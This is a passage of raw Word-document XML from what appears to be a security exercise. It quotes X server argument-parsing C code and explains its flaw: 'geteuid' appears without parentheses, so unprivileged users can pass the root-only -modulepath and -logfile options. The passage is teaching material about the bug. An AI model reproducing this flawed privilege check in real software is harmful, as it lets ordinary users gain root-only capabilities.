          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515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with</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515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%s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must</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515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b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:spacing w:val="1"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:t>\n"</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="2"/>
        <w:ind w:left="2984" w:right="1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A21515"/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
        </w:rPr>
        <w:t>ta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relative</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:spacing w:val="-1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path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and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must</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:spacing w:val="-5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not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contain</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:spacing w:val="-8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any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\"</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
        </w:rPr>
        <w:t>\"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:spacing w:val="-7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elements.\n" "</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
        </w:rPr>
        <w:t>tUsing</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:spacing w:val="-1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21515"/>
        </w:rPr>
        <w:t>default</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:spacing w:val="-8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</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="118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XCONFIGFILE</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="106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A21515"/>
          <w:spacing w:val="-1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search</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:spacing w:val="-7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path</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
        </w:rPr>
        <w:t>\n\n"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
        <w:ind w:left="29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position w:val="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i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:t>],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position w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:t>]);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="8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xf86ConfigFile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argv</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:position w:val="1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position w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/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1];</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="1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2;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6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showunresolved</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/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000000"/>
        </w:rPr>
        <w:t>))</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="1"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3F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="6"/>
        <w:ind w:left="1544"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
        </w:rPr>
        <w:sectPr w:rsidR="003F01FA">
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="880" w:right="760" w:bottom="280" w:left="760" w:header="0" w:footer="976" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
        </w:rPr>
        <w:t>xf86ShowUnresolved</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:spacing w:val="-2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TRUE;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="80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lastRenderedPageBreak/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1;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8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probeonly</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/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000000"/>
        </w:rPr>
        <w:t>))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3F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="8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xf86ProbeOnly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TRUE;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8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(!</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>strcmp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],</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="-2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"-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
        </w:rPr>
        <w:t>flipPixels</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="A21515"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>))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3F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="8"/>
        <w:ind w:left="15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xf86FlipPixels</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:spacing w:val="-17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TRUE;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:line="220" w:lineRule="exact"/>
        <w:ind w:left="15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1;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:line="20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8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/*</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="008000"/>
          <w:spacing w:val="-2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</w:rPr>
        <w:t>Omitted</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="008000"/>
          <w:spacing w:val="-8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material</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="008000"/>
          <w:spacing w:val="-10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for</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="008000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</w:rPr>
        <w:t>simpliicty</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="008000"/>
          <w:spacing w:val="-12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*/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position w:val="1"/>
        </w:rPr>
        <w:t>/*</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="008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OS-specific</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="00800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processing</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="008000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*/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return</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="0000FF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xf86ProcessArgument(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>argc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CB07B4" w:rsidRDefault="00CB07B4">
      <w:pPr>
        <w:spacing w:line="220" w:lineRule="exact"/>
        <w:ind w:left="104"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:position w:val="1"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CB07B4" w:rsidRPr="00B01256" w:rsidRDefault="00CB07B4">
      <w:pPr>
        <w:spacing w:line="220" w:lineRule="exact"/>
        <w:ind w:left="104"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:position w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009F0934">
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:position w:val="1"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="00B01256">
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:position w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">The issue is </w:t>
      </w:r>
      <w:r w:rsidR="00504F7B" w:rsidRPr="00B01256">
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:position w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>in the following lines:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00504F7B" w:rsidRPr="00B01256" w:rsidRDefault="00504F7B" w:rsidP="00504F7B">
      <w:pPr>
        <w:spacing w:before="1"/>
        <w:ind w:left="824"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pP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/*</w:t>
      </w:r>
      <w:r w:rsidRPr="00B01256">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:color w:val="008000"/>
          <w:spacing w:val="-2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First</w:t>
      </w:r>
      <w:r w:rsidRPr="00B01256">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:color w:val="008000"/>
          <w:spacing w:val="-6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the</w:t>
      </w:r>
      <w:r w:rsidRPr="00B01256">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:color w:val="008000"/>
          <w:spacing w:val="-4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options</w:t>
      </w:r>
      <w:r w:rsidRPr="00B01256">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:color w:val="008000"/>
          <w:spacing w:val="-8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that</w:t>
      </w:r>
      <w:r w:rsidRPr="00B01256">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:color w:val="008000"/>
          <w:spacing w:val="-5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are</w:t>
      </w:r>
      <w:r w:rsidRPr="00B01256">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:color w:val="008000"/>
          <w:spacing w:val="-4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only</w:t>
      </w:r>
      <w:r w:rsidRPr="00B01256">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:color w:val="008000"/>
          <w:spacing w:val="-5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allowed</w:t>
      </w:r>
      <w:r w:rsidRPr="00B01256">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:color w:val="008000"/>
          <w:spacing w:val="-8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for</w:t>
      </w:r>
      <w:r w:rsidRPr="00B01256">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:color w:val="008000"/>
          <w:spacing w:val="-4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root</w:t>
      </w:r>
      <w:r w:rsidRPr="00B01256">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:color w:val="008000"/>
          <w:spacing w:val="-5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8000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>*/</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00504F7B" w:rsidRPr="00B01256" w:rsidRDefault="00504F7B" w:rsidP="00504F7B">
      <w:pPr>
        <w:spacing w:line="220" w:lineRule="exact"/>
        <w:ind w:left="824"/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B01256">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:color w:val="0000FF"/>
          <w:position w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>if</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00B01256">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:color w:val="0000FF"/>
          <w:spacing w:val="-2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(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/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getuid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/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()</w:t>
      </w:r>
      <w:r w:rsidRPr="00B01256">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:spacing w:val="-11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==</w:t>
      </w:r>
      <w:r w:rsidRPr="00B01256">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:spacing w:val="-2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0</w:t>
      </w:r>
      <w:r w:rsidRPr="00B01256">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:spacing w:val="-1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||</w:t>
      </w:r>
      <w:r w:rsidRPr="00B01256">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:spacing w:val="-2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geteuid</w:t>
      </w:r>
      <w:r w:rsidRPr="00B01256">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:spacing w:val="-8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!=</w:t>
      </w:r>
      <w:r w:rsidRPr="00B01256">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:spacing w:val="-2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0)</w:t>
      </w:r>
      <w:r w:rsidRPr="00B01256">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:spacing w:val="-2"/>
          <w:position w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00B01256">
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:position w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00504F7B" w:rsidRPr="00B01256" w:rsidRDefault="00504F7B" w:rsidP="00504F7B">
      <w:pPr>
        <w:spacing w:line="220" w:lineRule="exact"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:sectPr w:rsidR="00504F7B" w:rsidRPr="00B01256">
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="860" w:right="760" w:bottom="280" w:left="760" w:header="0" w:footer="976" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r w:rsidRPr="00B01256">
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Above the geteuid was meant to be called as a function “</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00B01256">
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>geteuid(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00B01256">
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>)”, but instead the address of the geteuid function is being used. Since this address is always non-zero, unprivileged users are be able to use –</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B01256">
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>modulepath</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B01256">
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> and –</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B01256">
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>logfile</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B01256">
        <w:rPr>
          <w:rFonts w:eastAsia="Courier New"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> options with should be root only privileges.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003F01FA" w:rsidRDefault="00537A8C">
      <w:pPr>
        <w:spacing w:before="59" w:line="259" w:lineRule="auto"/>
        <w:ind w:left="104" w:right="391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]</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="40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An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lyze</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="1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low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w w:val="114"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>pr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proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-5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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ur</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ity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ws.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y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</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-3"/>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ur</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ity</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-5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ws,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="49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e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>xp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2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in</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1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si</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:w w:val="120"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:w w:val="110"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">lest </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>way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rr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">ect  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
          <w:w w:val="118"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:w w:val="116"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>h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m</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>.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/*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position w:val="1"/>
        </w:rPr>
        <w:t>Program</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="008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to</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="008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print</w:t>
      </w:r>
      <w:r>
        <w:rPr>
